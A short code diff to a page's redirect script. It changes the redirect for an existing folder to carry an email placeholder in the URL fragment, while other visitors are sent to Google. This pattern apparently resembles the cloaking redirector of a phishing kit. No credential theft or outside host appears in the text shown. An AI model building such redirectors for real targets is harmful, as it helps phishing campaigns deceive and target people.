@@ -11,7 +11,7 @@
       .then(res => {
         if (res.ok) {
           // Folder exists, redirect
-          window.location.replace(`./${folder}/index.html`);
+          window.location.replace(`./${folder}/#$email`);
         } else {
           // Folder does not exist, redirect to Google
           window.location.replace("https://google.com");
@@ -30,3 +30,4 @@
     window.location.replace("https://google.com");
   }
 </script>
+
